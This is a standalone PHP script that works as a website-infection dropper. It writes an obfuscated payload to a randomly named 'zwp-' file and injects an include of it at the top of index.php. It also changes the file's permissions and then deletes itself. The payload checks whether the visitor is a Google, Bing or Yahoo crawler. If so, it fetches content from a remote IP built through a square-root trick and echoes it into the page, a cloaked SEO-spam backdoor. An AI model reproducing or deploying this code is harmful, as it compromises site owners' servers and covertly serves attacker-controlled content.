<?php


$code = '<?php $botbotbot = "...".mb_strtolower($_SERVER[HTTP_USER_AGENT]);$botbotbot = str_replace(" ", "-", $botbotbot);if ((strpos($botbotbot,"google")) OR (strpos($botbotbot,"bing")) OR (strpos($botbotbot,"yahoo"))){$ch = curl_init();    $xxx = sqrt(30976);    curl_setopt($ch, CURLOPT_URL, "http://$xxx.31.253.227/cakes/?useragent=$botbotbot&domain=$_SERVER[HTTP_HOST]");       $result = curl_exec($ch);       curl_close ($ch);  	echo $result;}?>
';

$let = array ("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$mynamee='zwp-';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$mynamee .= $let[$r];     
} 

if (file_exists("index.php"))
{
	 $file = fopen("index.php", "r");
$buffer = fread($file, filesize("index.php")); 
$buffer2 = str_replace("\n", "11111111111111", $buffer);
if (strpos($buffer2, 'zwp-')<5) 
{
chmod ("index.php", 0777);
$out = fopen("$mynamee", "w");
fwrite($out, $code);
fclose($out);

$file = fopen("index.php", "r");  


    $file_data = "<?php include(\"".$mynamee."\");?>\n".$buffer;
    file_put_contents('index.php', $file_data);
chmod ("index.php", 0644);
}
}
@unlink("z1.php");

?>